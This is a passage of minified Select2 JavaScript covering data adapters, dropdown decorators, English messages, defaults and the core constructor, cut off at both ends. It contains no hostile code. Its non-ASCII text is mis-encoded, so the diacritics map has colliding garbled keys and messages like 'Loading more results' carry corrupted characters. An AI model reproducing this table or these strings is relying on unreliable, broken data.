"ê£": "z", "Î": "Î", "Î": "Î", "Î": "Î", "Î": "Î", "Îª": "Î", "Î": "Î", "Î": "Î¥", "Î«": "Î¥", "Î": "Î©", "Î¬": "Î±", "Î­": "Îµ", "Î®": "Î·", "Î¯": "Î¹", "Ï": "Î¹", "Î": "Î¹", "Ï": "Î¿", "Ï": "Ï", "Ï": "Ï", "Î°": "Ï", "Ï": "Ï", "Ï": "Ï", "â": "'" } }), t.define("select2/data/base", ["../utils"], function (i) { function n(t, e) { n.__super__.constructor.call(this) } return i.Extend(n, i.Observable), n.prototype.current = function (t) { throw new Error("The `current` method must be defined in child classes.") }, n.prototype.query = function (t, e) { throw new Error("The `query` method must be defined in child classes.") }, n.prototype.bind = function (t, e) { }, n.prototype.destroy = function () { }, n.prototype.generateResultId = function (t, e) { var n = t.id + "-result-"; return n += i.generateChars(4), null != e.id ? n += "-" + e.id.toString() : n += "-" + i.generateChars(4), n }, n }), t.define("select2/data/select", ["./base", "../utils", "jquery"], function (t, r, g) { function n(t, e) { this.$element = t, this.options = e, n.__super__.constructor.call(this) } return r.Extend(n, t), n.prototype.current = function (t) { var n = [], i = this; this.$element.find(":selected").each(function () { var t = g(this), e = i.item(t); n.push(e) }), t(n) }, n.prototype.select = function (o) { var t, a = this; if (o.selected = !0, g(o.element).is("option")) return o.element.selected = !0, void this.$element.trigger("change"); this.$element.prop("multiple") ? this.current(function (t) { var e = []; (o = [o]).push.apply(o, t); for (var n = 0; n < o.length; n++) { var i = o[n].id; -1 === g.inArray(i, e) && e.push(i) } a.$element.val(e), a.$element.trigger("change") }) : (t = o.id, this.$element.val(t), this.$element.trigger("change")) }, n.prototype.unselect = function (o) { var a = this; if (this.$element.prop("multiple")) { if (o.selected = !1, g(o.element).is("option")) return o.element.selected = !1, void this.$element.trigger("change"); this.current(function (t) { for (var e = [], n = 0; n < t.length; n++) { var i = t[n].id; i !== o.id && -1 === g.inArray(i, e) && e.push(i) } a.$element.val(e), a.$element.trigger("change") }) } }, n.prototype.bind = function (t, e) { var n = this; (this.container = t).on("select", function (t) { n.select(t.data) }), t.on("unselect", function (t) { n.unselect(t.data) }) }, n.prototype.destroy = function () { this.$element.find("*").each(function () { r.RemoveData(this) }) }, n.prototype.query = function (i, t) { var o = [], a = this; this.$element.children().each(function () { var t, e, n = g(this); (n.is("option") || n.is("optgroup")) && (t = a.item(n), null !== (e = a.matches(i, t)) && o.push(e)) }), t({ results: o }) }, n.prototype.addOptions = function (t) { r.appendMany(this.$element, t) }, n.prototype.option = function (t) { var e; t.children ? (e = document.createElement("optgroup")).label = t.text : void 0 !== (e = document.createElement("option")).textContent ? e.textContent = t.text : e.innerText = t.text, void 0 !== t.id && (e.value = t.id), t.disabled && (e.disabled = !0), t.selected && (e.selected = !0), t.title && (e.title = t.title); var n = g(e), i = this._normalizeItem(t); return i.element = e, r.StoreData(e, "data", i), n }, n.prototype.item = function (t) { var e = {}; if (null != (e = r.GetData(t[0], "data"))) return e; if (t.is("option")) e = { id: t.val(), text: t.text(), disabled: t.prop("disabled"), selected: t.prop("selected"), title: t.prop("title") }; else if (t.is("optgroup")) { e = { text: t.prop("label"), children: [], title: t.prop("title") }; for (var n = t.children("option"), i = [], o = 0; o < n.length; o++) { var a = g(n[o]), s = this.item(a); i.push(s) } e.children = i } return (e = this._normalizeItem(e)).element = t[0], r.StoreData(t[0], "data", e), e }, n.prototype._normalizeItem = function (t) { return t !== Object(t) && (t = { id: t, text: t }), null != (t = g.extend({}, { text: "" }, t)).id && (t.id = t.id.toString()), null != t.text && (t.text = t.text.toString()), null == t._resultId && t.id && null != this.container && (t._resultId = this.generateResultId(this.container, t)), g.extend({}, { selected: !1, disabled: !1 }, t) }, n.prototype.matches = function (t, e) { return this.options.get("matcher")(t, e) }, n }), t.define("select2/data/array", ["./select", "../utils", "jquery"], function (t, h, d) { function i(t, e) { var n = e.get("data") || []; i.__super__.constructor.call(this, t, e), this.addOptions(this.convertToOptions(n)) } return h.Extend(i, t), i.prototype.select = function (n) { var t = this.$element.find("option").filter(function (t, e) { return e.value == n.id.toString() }); 0 === t.length && (t = this.option(n), this.addOptions(t)), i.__super__.select.call(this, n) }, i.prototype.convertToOptions = function (t) { for (var e = this, n = this.$element.find("option"), i = n.map(function () { return e.item(d(this)).id }).get(), o = [], a = 0; a < t.length; a++) { var s, r, g, l, c, I, u = this._normalizeItem(t[a]); 0 <= d.inArray(u.id, i) ? (s = n.filter(function (t) { return function () { return d(this).val() == t.id } }(u)), r = this.item(s), g = d.extend(!0, {}, u, r), l = this.option(g), s.replaceWith(l)) : (c = this.option(u), u.children && (I = this.convertToOptions(u.children), h.appendMany(c, I)), o.push(c)) } return o }, i }), t.define("select2/data/ajax", ["./array", "../utils", "jquery"], function (t, e, a) { function n(t, e) { this.ajaxOptions = this._applyDefaults(e.get("ajax")), null != this.ajaxOptions.processResults && (this.processResults = this.ajaxOptions.processResults), n.__super__.constructor.call(this, t, e) } return e.Extend(n, t), n.prototype._applyDefaults = function (t) { var e = { data: function (t) { return a.extend({}, t, { q: t.term }) }, transport: function (t, e, n) { var i = a.ajax(t); return i.then(e), i.fail(n), i } }; return a.extend({}, e, t, !0) }, n.prototype.processResults = function (t) { return t }, n.prototype.query = function (n, i) { var o = this; null != this._request && (a.isFunction(this._request.abort) && this._request.abort(), this._request = null); var e = a.extend({ type: "GET" }, this.ajaxOptions); function t() { var t = e.transport(e, function (t) { var e = o.processResults(t, n); o.options.get("debug") && window.console && console.error && (e && e.results && a.isArray(e.results) || console.error("Select2: The AJAX results did not return an array in the `results` key of the response.")), i(e) }, function () { "status" in t && (0 === t.status || "0" === t.status) || o.trigger("results:message", { message: "errorLoading" }) }); o._request = t } "function" == typeof e.url && (e.url = e.url.call(this.$element, n)), "function" == typeof e.data && (e.data = e.data.call(this.$element, n)), this.ajaxOptions.delay && null != n.term ? (this._queryTimeout && window.clearTimeout(this._queryTimeout), this._queryTimeout = window.setTimeout(t, this.ajaxOptions.delay)) : t() }, n }), t.define("select2/data/tags", ["jquery"], function (c) { function t(t, e, n) { var i = n.get("tags"), o = n.get("createTag"); void 0 !== o && (this.createTag = o); var a = n.get("insertTag"); if (void 0 !== a && (this.insertTag = a), t.call(this, e, n), c.isArray(i)) for (var s = 0; s < i.length; s++) { var r = i[s], g = this._normalizeItem(r), l = this.option(g); this.$element.append(l) } } return t.prototype.query = function (t, l, c) { var I = this; this._removeOldTags(), null != l.term && null == l.page ? t.call(this, l, function t(e, n) { for (var i = e.results, o = 0; o < i.length; o++) { var a = i[o], s = null != a.children && !t({ results: a.children }, !0); if ((a.text || "").toUpperCase() === (l.term || "").toUpperCase() || s) return !n && (e.data = i, void c(e)) } if (n) return !0; var r, g = I.createTag(l); null != g && ((r = I.option(g)).attr("data-select2-tag", !0), I.addOptions([r]), I.insertTag(i, g)), e.results = i, c(e) }) : t.call(this, l, c) }, t.prototype.createTag = function (t, e) { var n = c.trim(e.term); return "" === n ? null : { id: n, text: n } }, t.prototype.insertTag = function (t, e, n) { e.unshift(n) }, t.prototype._removeOldTags = function (t) { this._lastTag, this.$element.find("option[data-select2-tag]").each(function () { this.selected || c(this).remove() }) }, t }), t.define("select2/data/tokenizer", ["jquery"], function (I) { function t(t, e, n) { var i = n.get("tokenizer"); void 0 !== i && (this.tokenizer = i), t.call(this, e, n) } return t.prototype.bind = function (t, e, n) { t.call(this, e, n), this.$search = e.dropdown.$search || e.selection.$search || n.find(".select2-search__field") }, t.prototype.query = function (t, e, n) { var o = this; e.term = e.term || ""; var i = this.tokenizer(e, this.options, function (t) { var e, n, i = o._normalizeItem(t); o.$element.find("option").filter(function () { return I(this).val() === i.id }).length || ((e = o.option(i)).attr("data-select2-tag", !0), o._removeOldTags(), o.addOptions([e])), n = i, o.trigger("select", { data: n }) }); i.term !== e.term && (this.$search.length && (this.$search.val(i.term), this.$search.focus()), e.term = i.term), t.call(this, e, n) }, t.prototype.tokenizer = function (t, e, n, i) { for (var o = n.get("tokenSeparators") || [], a = e.term, s = 0, r = this.createTag || function (t) { return { id: t.term, text: t.term } }; s < a.length;) { var g, l, c = a[s]; -1 !== I.inArray(c, o) ? (g = a.substr(0, s), null != (l = r(I.extend({}, e, { term: g }))) ? (i(l), a = a.substr(s + 1) || "", s = 0) : s++) : s++ } return { term: a } }, t }), t.define("select2/data/minimumInputLength", [], function () { function t(t, e, n) { this.minimumInputLength = n.get("minimumInputLength"), t.call(this, e, n) } return t.prototype.query = function (t, e, n) { e.term = e.term || "", e.term.length < this.minimumInputLength ? this.trigger("results:message", { message: "inputTooShort", args: { minimum: this.minimumInputLength, input: e.term, params: e } }) : t.call(this, e, n) }, t }), t.define("select2/data/maximumInputLength", [], function () { function t(t, e, n) { this.maximumInputLength = n.get("maximumInputLength"), t.call(this, e, n) } return t.prototype.query = function (t, e, n) { e.term = e.term || "", 0 < this.maximumInputLength && e.term.length > this.maximumInputLength ? this.trigger("results:message", { message: "inputTooLong", args: { maximum: this.maximumInputLength, input: e.term, params: e } }) : t.call(this, e, n) }, t }), t.define("select2/data/maximumSelectionLength", [], function () { function t(t, e, n) { this.maximumSelectionLength = n.get("maximumSelectionLength"), t.call(this, e, n) } return t.prototype.query = function (n, i, o) { var a = this; this.current(function (t) { var e = null != t ? t.length : 0; 0 < a.maximumSelectionLength && e >= a.maximumSelectionLength ? a.trigger("results:message", { message: "maximumSelected", args: { maximum: a.maximumSelectionLength } }) : n.call(a, i, o) }) }, t }), t.define("select2/dropdown", ["jquery", "./utils"], function (e, t) { function n(t, e) { this.$element = t, this.options = e, n.__super__.constructor.call(this) } return t.Extend(n, t.Observable), n.prototype.render = function () { var t = e('<span class="select2-dropdown"><span class="select2-results"></span></span>'); return t.attr("dir", this.options.get("dir")), this.$dropdown = t }, n.prototype.bind = function () { }, n.prototype.position = function (t, e) { }, n.prototype.destroy = function () { this.$dropdown.remove() }, n }), t.define("select2/dropdown/search", ["jquery", "../utils"], function (o, t) { function e() { } return e.prototype.render = function (t) { var e = t.call(this), n = o('<span class="select2-search select2-search--dropdown"><input class="select2-search__field" type="search" tabindex="-1" autocomplete="off" autocorrect="off" autocapitalize="none" spellcheck="false" role="textbox" /></span>'); return this.$searchContainer = n, this.$search = n.find("input"), e.prepend(n), e }, e.prototype.bind = function (t, e, n) { var i = this; t.call(this, e, n), this.$search.on("keydown", function (t) { i.trigger("keypress", t), i._keyUpPrevented = t.isDefaultPrevented() }), this.$search.on("input", function (t) { o(this).off("keyup") }), this.$search.on("keyup input", function (t) { i.handleSearch(t) }), e.on("open", function () { i.$search.attr("tabindex", 0), i.$search.focus(), window.setTimeout(function () { i.$search.focus() }, 0) }), e.on("close", function () { i.$search.attr("tabindex", -1), i.$search.val(""), i.$search.blur() }), e.on("focus", function () { e.isOpen() || i.$search.focus() }), e.on("results:all", function (t) { null != t.query.term && "" !== t.query.term || (i.showSearch(t) ? i.$searchContainer.removeClass("select2-search--hide") : i.$searchContainer.addClass("select2-search--hide")) }) }, e.prototype.handleSearch = function (t) { var e; this._keyUpPrevented || (e = this.$search.val(), this.trigger("query", { term: e })), this._keyUpPrevented = !1 }, e.prototype.showSearch = function (t, e) { return !0 }, e }), t.define("select2/dropdown/hidePlaceholder", [], function () { function t(t, e, n, i) { this.placeholder = this.normalizePlaceholder(n.get("placeholder")), t.call(this, e, n, i) } return t.prototype.append = function (t, e) { e.results = this.removePlaceholder(e.results), t.call(this, e) }, t.prototype.normalizePlaceholder = function (t, e) { return "string" == typeof e && (e = { id: "", text: e }), e }, t.prototype.removePlaceholder = function (t, e) { for (var n = e.slice(0), i = e.length - 1; 0 <= i; i--) { var o = e[i]; this.placeholder.id === o.id && n.splice(i, 1) } return n }, t }), t.define("select2/dropdown/infiniteScroll", ["jquery"], function (o) { function t(t, e, n, i) { this.lastParams = {}, t.call(this, e, n, i), this.$loadingMore = this.createLoadingMore(), this.loading = !1 } return t.prototype.append = function (t, e) { this.$loadingMore.remove(), this.loading = !1, t.call(this, e), this.showLoadingMore(e) && this.$results.append(this.$loadingMore) }, t.prototype.bind = function (t, e, n) { var i = this; t.call(this, e, n), e.on("query", function (t) { i.lastParams = t, i.loading = !0 }), e.on("query:append", function (t) { i.lastParams = t, i.loading = !0 }), this.$results.on("scroll", function () { var t, e = o.contains(document.documentElement, i.$loadingMore[0]); !i.loading && e && (t = i.$results.offset().top + i.$results.outerHeight(!1), i.$loadingMore.offset().top + i.$loadingMore.outerHeight(!1) <= t + 50 && i.loadMore()) }) }, t.prototype.loadMore = function () { this.loading = !0; var t = o.extend({}, { page: 1 }, this.lastParams); t.page++, this.trigger("query:append", t) }, t.prototype.showLoadingMore = function (t, e) { return e.pagination && e.pagination.more }, t.prototype.createLoadingMore = function () { var t = o('<li class="select2-results__option select2-results__option--load-more"role="treeitem" aria-disabled="true"></li>'), e = this.options.get("translations").get("loadingMore"); return t.html(e(this.lastParams)), t }, t }), t.define("select2/dropdown/attachBody", ["jquery", "../utils"], function (d, r) { function t(t, e, n) { this.$dropdownParent = n.get("dropdownParent") || d(document.body), t.call(this, e, n) } return t.prototype.bind = function (t, e, n) { var i = this, o = !1; t.call(this, e, n), e.on("open", function () { i._showDropdown(), i._attachPositioningHandler(e), o || (o = !0, e.on("results:all", function () { i._positionDropdown(), i._resizeDropdown() }), e.on("results:append", function () { i._positionDropdown(), i._resizeDropdown() })) }), e.on("close", function () { i._hideDropdown(), i._detachPositioningHandler(e) }), this.$dropdownContainer.on("mousedown", function (t) { t.stopPropagation() }) }, t.prototype.destroy = function (t) { t.call(this), this.$dropdownContainer.remove() }, t.prototype.position = function (t, e, n) { e.attr("class", n.attr("class")), e.removeClass("select2"), e.addClass("select2-container--open"), e.css({ position: "absolute", top: -999999 }), this.$container = n }, t.prototype.render = function (t) { var e = d("<span></span>"), n = t.call(this); return e.append(n), this.$dropdownContainer = e }, t.prototype._hideDropdown = function (t) { this.$dropdownContainer.detach() }, t.prototype._attachPositioningHandler = function (t, e) { var n = this, i = "scroll.select2." + e.id, o = "resize.select2." + e.id, a = "orientationchange.select2." + e.id, s = this.$container.parents().filter(r.hasScroll); s.each(function () { r.StoreData(this, "select2-scroll-position", { x: d(this).scrollLeft(), y: d(this).scrollTop() }) }), s.on(i, function (t) { var e = r.GetData(this, "select2-scroll-position"); d(this).scrollTop(e.y) }), d(window).on(i + " " + o + " " + a, function (t) { n._positionDropdown(), n._resizeDropdown() }) }, t.prototype._detachPositioningHandler = function (t, e) { var n = "scroll.select2." + e.id, i = "resize.select2." + e.id, o = "orientationchange.select2." + e.id; this.$container.parents().filter(r.hasScroll).off(n), d(window).off(n + " " + i + " " + o) }, t.prototype._positionDropdown = function () { var t = d(window), e = this.$dropdown.hasClass("select2-dropdown--above"), n = this.$dropdown.hasClass("select2-dropdown--below"), i = null, o = this.$container.offset(); o.bottom = o.top + this.$container.outerHeight(!1); var a = { height: this.$container.outerHeight(!1) }; a.top = o.top, a.bottom = o.top + a.height; var s = this.$dropdown.outerHeight(!1), r = t.scrollTop(), g = t.scrollTop() + t.height(), l = r < o.top - s, c = g > o.bottom + s, I = { left: o.left, top: a.bottom }, u = this.$dropdownParent; "static" === u.css("position") && (u = u.offsetParent()); var h = u.offset(); I.top -= h.top, I.left -= h.left, e || n || (i = "below"), c || !l || e ? !l && c && e && (i = "below") : i = "above", ("above" == i || e && "below" !== i) && (I.top = a.top - h.top - s), null != i && (this.$dropdown.removeClass("select2-dropdown--below select2-dropdown--above").addClass("select2-dropdown--" + i), this.$container.removeClass("select2-container--below select2-container--above").addClass("select2-container--" + i)), this.$dropdownContainer.css(I) }, t.prototype._resizeDropdown = function () { var t = { width: this.$container.outerWidth(!1) + "px" }; this.options.get("dropdownAutoWidth") && (t.minWidth = t.width, t.position = "relative", t.width = "auto"), this.$dropdown.css(t) }, t.prototype._showDropdown = function (t) { this.$dropdownContainer.appendTo(this.$dropdownParent), this._positionDropdown(), this._resizeDropdown() }, t }), t.define("select2/dropdown/minimumResultsForSearch", [], function () { function t(t, e, n, i) { this.minimumResultsForSearch = n.get("minimumResultsForSearch"), this.minimumResultsForSearch < 0 && (this.minimumResultsForSearch = 1 / 0), t.call(this, e, n, i) } return t.prototype.showSearch = function (t, e) { return !(function t(e) { for (var n = 0, i = 0; i < e.length; i++) { var o = e[i]; o.children ? n += t(o.children) : n++ } return n }(e.data.results) < this.minimumResultsForSearch) && t.call(this, e) }, t }), t.define("select2/dropdown/selectOnClose", ["../utils"], function (a) { function t() { } return t.prototype.bind = function (t, e, n) { var i = this; t.call(this, e, n), e.on("close", function (t) { i._handleSelectOnClose(t) }) }, t.prototype._handleSelectOnClose = function (t, e) { if (e && null != e.originalSelect2Event) { var n = e.originalSelect2Event; if ("select" === n._type || "unselect" === n._type) return } var i, o = this.getHighlightedResults(); o.length < 1 || null != (i = a.GetData(o[0], "data")).element && i.element.selected || null == i.element && i.selected || this.trigger("select", { data: i }) }, t }), t.define("select2/dropdown/closeOnSelect", [], function () { function t() { } return t.prototype.bind = function (t, e, n) { var i = this; t.call(this, e, n), e.on("select", function (t) { i._selectTriggered(t) }), e.on("unselect", function (t) { i._selectTriggered(t) }) }, t.prototype._selectTriggered = function (t, e) { var n = e.originalEvent; n && (n.ctrlKey || n.metaKey) || this.trigger("close", { originalEvent: n, originalSelect2Event: e }) }, t }), t.define("select2/i18n/en", [], function () { return { errorLoading: function () { return "The results could not be loaded." }, inputTooLong: function (t) { var e = t.input.length - t.maximum, n = "Please delete " + e + " character"; return 1 != e && (n += "s"), n }, inputTooShort: function (t) { return "Please enter " + (t.minimum - t.input.length) + " or more characters" }, loadingMore: function () { return "Loading more resultsâ¦" }, maximumSelected: function (t) { var e = "You can only select " + t.maximum + " item"; return 1 != t.maximum && (e += "s"), e }, noResults: function () { return "No results found" }, searching: function () { return "Searchingâ¦" }, removeAllItems: function () { return "Remove all items" } } }), t.define("select2/defaults", ["jquery", "require", "./results", "./selection/single", "./selection/multiple", "./selection/placeholder", "./selection/allowClear", "./selection/search", "./selection/eventRelay", "./utils", "./translation", "./diacritics", "./data/select", "./data/array", "./data/ajax", "./data/tags", "./data/tokenizer", "./data/minimumInputLength", "./data/maximumInputLength", "./data/maximumSelectionLength", "./dropdown", "./dropdown/search", "./dropdown/hidePlaceholder", "./dropdown/infiniteScroll", "./dropdown/attachBody", "./dropdown/minimumResultsForSearch", "./dropdown/selectOnClose", "./dropdown/closeOnSelect", "./i18n/en"], function (d, C, A, p, m, f, b, B, y, v, x, e, F, Q, G, w, X, S, k, D, Z, U, W, N, T, H, E, R, t) { function n() { this.reset() } return n.prototype.apply = function (e) { var t, n, i, o, a, s; if (null == (e = d.extend(!0, {}, this.defaults, e)).dataAdapter && (null != e.ajax ? e.dataAdapter = G : null != e.data ? e.dataAdapter = Q : e.dataAdapter = F, 0 < e.minimumInputLength && (e.dataAdapter = v.Decorate(e.dataAdapter, S)), 0 < e.maximumInputLength && (e.dataAdapter = v.Decorate(e.dataAdapter, k)), 0 < e.maximumSelectionLength && (e.dataAdapter = v.Decorate(e.dataAdapter, D)), e.tags && (e.dataAdapter = v.Decorate(e.dataAdapter, w)), null == e.tokenSeparators && null == e.tokenizer || (e.dataAdapter = v.Decorate(e.dataAdapter, X)), null != e.query && (t = C(e.amdBase + "compat/query"), e.dataAdapter = v.Decorate(e.dataAdapter, t)), null != e.initSelection && (n = C(e.amdBase + "compat/initSelection"), e.dataAdapter = v.Decorate(e.dataAdapter, n))), null == e.resultsAdapter && (e.resultsAdapter = A, null != e.ajax && (e.resultsAdapter = v.Decorate(e.resultsAdapter, N)), null != e.placeholder && (e.resultsAdapter = v.Decorate(e.resultsAdapter, W)), e.selectOnClose && (e.resultsAdapter = v.Decorate(e.resultsAdapter, E))), null == e.dropdownAdapter && (e.multiple ? e.dropdownAdapter = Z : (i = v.Decorate(Z, U), e.dropdownAdapter = i), 0 !== e.minimumResultsForSearch && (e.dropdownAdapter = v.Decorate(e.dropdownAdapter, H)), e.closeOnSelect && (e.dropdownAdapter = v.Decorate(e.dropdownAdapter, R)), null == e.dropdownCssClass && null == e.dropdownCss && null == e.adaptDropdownCssClass || (o = C(e.amdBase + "compat/dropdownCss"), e.dropdownAdapter = v.Decorate(e.dropdownAdapter, o)), e.dropdownAdapter = v.Decorate(e.dropdownAdapter, T)), null == e.selectionAdapter && (e.multiple ? e.selectionAdapter = m : e.selectionAdapter = p, null != e.placeholder && (e.selectionAdapter = v.Decorate(e.selectionAdapter, f)), e.allowClear && (e.selectionAdapter = v.Decorate(e.selectionAdapter, b)), e.multiple && (e.selectionAdapter = v.Decorate(e.selectionAdapter, B)), null == e.containerCssClass && null == e.containerCss && null == e.adaptContainerCssClass || (a = C(e.amdBase + "compat/containerCss"), e.selectionAdapter = v.Decorate(e.selectionAdapter, a)), e.selectionAdapter = v.Decorate(e.selectionAdapter, y)), "string" == typeof e.language && (0 < e.language.indexOf("-") ? (s = e.language.split("-")[0], e.language = [e.language, s]) : e.language = [e.language]), d.isArray(e.language)) { var r = new x; e.language.push("en"); for (var g = e.language, l = 0; l < g.length; l++) { var c = g[l], I = {}; try { I = x.loadPath(c) } catch (t) { try { c = this.defaults.amdLanguageBase + c, I = x.loadPath(c) } catch (t) { e.debug && window.console && console.warn && console.warn('Select2: The language file for "' + c + '" could not be automatically loaded. A fallback will be used instead.'); continue } } r.extend(I) } e.translations = r } else { var u = x.loadPath(this.defaults.amdLanguageBase + "en"), h = new x(e.language); h.extend(u), e.translations = h } return e }, n.prototype.reset = function () { function r(t) { return t.replace(/[^\u0000-\u007E]/g, function (t) { return e[t] || t }) } this.defaults = { amdBase: "./", amdLanguageBase: "./i18n/", closeOnSelect: !0, debug: !1, dropdownAutoWidth: !1, escapeMarkup: v.escapeMarkup, language: t, matcher: function t(e, n) { if ("" === d.trim(e.term)) return n; if (n.children && 0 < n.children.length) { for (var i = d.extend(!0, {}, n), o = n.children.length - 1; 0 <= o; o--)null == t(e, n.children[o]) && i.children.splice(o, 1); return 0 < i.children.length ? i : t(e, i) } var a = r(n.text).toUpperCase(), s = r(e.term).toUpperCase(); return -1 < a.indexOf(s) ? n : null }, minimumInputLength: 0, maximumInputLength: 0, maximumSelectionLength: 0, minimumResultsForSearch: 0, selectOnClose: !1, scrollAfterSelect: !1, sorter: function (t) { return t }, templateResult: function (t) { return t.text }, templateSelection: function (t) { return t.text }, theme: "default", width: "resolve" } }, n.prototype.set = function (t, e) { var n = {}; n[d.camelCase(t)] = e; var i = v._convertData(n); d.extend(!0, this.defaults, i) }, new n }), t.define("select2/options", ["require", "jquery", "./defaults", "./utils"], function (i, c, o, I) { function t(t, e) { var n; this.options = t, null != e && this.fromElement(e), this.options = o.apply(this.options), e && e.is("input") && (n = i(this.get("amdBase") + "compat/inputData"), this.options.dataAdapter = I.Decorate(this.options.dataAdapter, n)) } return t.prototype.fromElement = function (t) { var e = ["select2"]; null == this.options.multiple && (this.options.multiple = t.prop("multiple")), null == this.options.disabled && (this.options.disabled = t.prop("disabled")), null == this.options.language && (t.prop("lang") ? this.options.language = t.prop("lang").toLowerCase() : t.closest("[lang]").prop("lang") && (this.options.language = t.closest("[lang]").prop("lang"))), null == this.options.dir && (t.prop("dir") ? this.options.dir = t.prop("dir") : t.closest("[dir]").prop("dir") ? this.options.dir = t.closest("[dir]").prop("dir") : this.options.dir = "ltr"), t.prop("disabled", this.options.disabled), t.prop("multiple", this.options.multiple), I.GetData(t[0], "select2Tags") && (this.options.debug && window.console && console.warn && console.warn('Select2: The `data-select2-tags` attribute has been changed to use the `data-data` and `data-tags="true"` attributes and will be removed in future versions of Select2.'), I.StoreData(t[0], "data", I.GetData(t[0], "select2Tags")), I.StoreData(t[0], "tags", !0)), I.GetData(t[0], "ajaxUrl") && (this.options.debug && window.console && console.warn && console.warn("Select2: The `data-ajax-url` attribute has been changed to `data-ajax--url` and support for the old attribute will be removed in future versions of Select2."), t.attr("ajax--url", I.GetData(t[0], "ajaxUrl")), I.StoreData(t[0], "ajax-Url", I.GetData(t[0], "ajaxUrl"))); var n = {}; function i(t, e) { return e.toUpperCase() } for (var o = 0; o < t[0].attributes.length; o++) { var a, s, r = t[0].attributes[o].name; "data-" == r.substr(0, "data-".length) && (a = r.substring("data-".length), s = I.GetData(t[0], a), n[a.replace(/-([a-z])/g, i)] = s) } c.fn.jquery && "1." == c.fn.jquery.substr(0, 2) && t[0].dataset && (n = c.extend(!0, {}, t[0].dataset, n)); var g = c.extend(!0, {}, I.GetData(t[0]), n), g = I._convertData(g); for (var l in g) -1 < c.inArray(l, e) || (c.isPlainObject(this.options[l]) ? c.extend(this.options[l], g[l]) : this.options[l] = g[l]); return this }, t.prototype.get = function (t) { return this.options[t] }, t.prototype.set = function (t, e) { this.options[t] = e }, t }), t.define("select2/core", ["jquery", "./options", "./utils", "./keys"], function (o, l, c, i) { var I = function (t, e) { null != c.GetData(t[0], "select2") && c.GetData(t[0], "select2").destroy(), this.$element = t, this.id = this._generateId(t), e = e || {}, this.options = new l(e, t), I.__super__.constructor.call(this); var n = t.attr("tabindex") || 0; c.StoreData(t[0], "old-tabindex", n), t.attr("tabindex", "-1"); var i = this.options.get("dataAdapter"); this.dataAdapter = new i(t, this.options); var o = this.render(); this._placeContainer(o); var a = this.options.get("selectionAdapter"); this.selection = new a(t, this.options), this.$selection = this.selection.render(), this.selection.position(this.$selection, o); var s = this.options.get("dropdownAdapter"); this.dropdown = new s(t, this.options), this.$dropdown = this.dropdown.render(), this.dropdown.position(this.$dropdown, o); var r = this.options.get("resultsAdapter"); this.results = new r(t, this.options, this.dataAdapter), this.$results = this.results.render(), this.results.position(this.$results, this.$dropdown); var g = this; this._bindAdapters(), this._registerDomEvents(), this._registerDataEvents(), this._registerSelectionEvents(), this._registerDropdownEvents(), this._registerResultsEvents(), this._registerEvents(), this.dataAdapter.current(function (t) { g.trigger("selection:update", { data: t }) }), t.addClass("select2-hidden-accessible"), t.attr("aria-hidden", "true"), this._syncAttributes(), c.StoreData(t[0], "select2", this), t.data("select2", this) }; return c.Extend(I, c.Observable), I.prototype._generateId = function (t) { return "select2-" + (null != t.attr("id") ? t.attr("id") : null != t.attr("name") ? t.attr("name") + "-" + c.generateChars(2) : c.generateChars(4)).replace(/(:|\.|\[|\]|,)/g, "") }, I.prototype._placeContainer = function (t) { t.insertAfter(this.$element); var e = this._resolveWidth(this.$element, this.options.get("width")); null != e && t.css("width", e) }, I.prototype._resolveWidth = function (t, e) { var n = /^width:(([-+]?([0-9]*\.)?[0-9]+)(px|em|ex|%|in|cm|mm|pt|pc))/i; if ("resolve" == e) { var i = this._resolveWidth(t, "style"); return null != i ? i : this._resolveWidth(t, "element") } if ("element" == e) { var o = t.outerWidth(!1); return o <= 0 ? "auto" : o + "px" } if ("style" != e) return e; var a = t.attr("style"); if ("string" != typeof a) return null; for (var s = a.split(";"), r = 0, g = s.length; r < g; r += 1) { var l = s[r].replace(/\s/g, "").match(n); if (null !== l && 1 <= l.length) return l[1] } return null }, I.prototype._bindAdapters = function () { this.dataAdapter.bind(this, this.$container), this.selection.bind(this, this.$container), this.dropdown.bind(this, this.$container), this.results.bind(this, this.$container) }, I.prototype._registerDomEvents = function () { var e = this; this.$element.on("change.select2", function () { e.dataAdapter.current(function (t) { e.trigger("selection:update", { data: t }) }) }), this.$element.on("focus.select2", function (t) { e.trigger("focus", t) }), this._syncA = c.bind(this._syncAttributes, this), this._syncS = c.bind(this._syncSubtree, this), this.$element[0].attachEvent && this.$element[0].attachEvent("onpropertychange", this._syncA); var t = window.MutationObserver || window.WebKitMutationObserver || window.MozMutationObserver; null != t ? (this._observer = new t(function (t) { o.each(t, e._syncA), o.each(t, e._syncS) }), this._observer.observe(this.$element[0], { attributes: !0, childList: !0, subtree: !1 })) : this.$element[0].addEventListener && (this.$element[0].addEventListener("DOMAttrModified", e._syncA, !1), this.$element[0].addEventListener("DOMNodeInserted", e._syncS, !1), this.$element[0].addEventListener("DOMNodeRemoved", e._syncS, !1)) }, I.prototype._registerDataEvents = function () { var n = this; this.dataAdapter.on("*", function (t, e) { n.trigger(t, e) }) }, I.prototype._registerSelectionEvents = function () { var n = this, i = ["toggle", "focus"]; this.selection.on("toggle", function () { n.toggleDropdown() }), this.selection.on("focus", function (t) { n.focus(t) }), this.selection.on("*", function (t, e) { -1 === o.inArray(t, i) && n.trigger(t, e) }) }, I.prototype._registerDropdownEvents = function () { var n = this; this.dropdown.on("*", function (t, e) { n.trigger(t, e) }) }, I.prototype._registerResultsEvents = function () { var n = this; this.results.on("*", function (t, e) { n.trigger(t, e) }) }, I.prototype._registerEvents = function () { var n = this; this.on("open", function () { n.$container.addClass("select2-container--open") }), this.on("close", function () { n.$container.removeClass("select2-container--open") }), this.on("enable", function () { n.$container.removeClass("select2-container--disabled") }), this.on("disable", function () { n.$container.addClass("select2-container--disabled") }), this.on("blur", function () { n.$container.removeClass("select2-container--focus") }), this.on("query", function (e) { n.isOpen() || n.trigger("open", {}), this.dataAdapter.query(e, function (t) { n.trigger("results:all", { data: t, query: e }) }) }), this.on("query:append", function (e) { this.dataAdapter.query(e, function (t) { n.trigger("results:append", { data: t, query: e }) }) }), this.on("keypress", function (t) { var e = t.which; n.isOpen() ? e === i.ESC || e === i.TAB || e === i.UP && t.altKey ? (n.close(), t.preventDefault()) : e === i.ENTER ? (n.trigger("results:select", {}), t.preventDefault()) : e === i.SPACE && t.ctrlKey ? (n.trigger("results:toggle", {}), t.preventDefault()) : e === i.UP ? (n.trigger("results:previous", {}), t.preventDefault()) : e === i.DOWN && (n.trigger("results:next", {}), t.preventDefault()) : (e === i.ENTER || e === i.SPACE || e === i.DOWN && t.altKey) && (n.open(), t.preventDefault()) }) }, I.prototype._syncAttributes = function () { 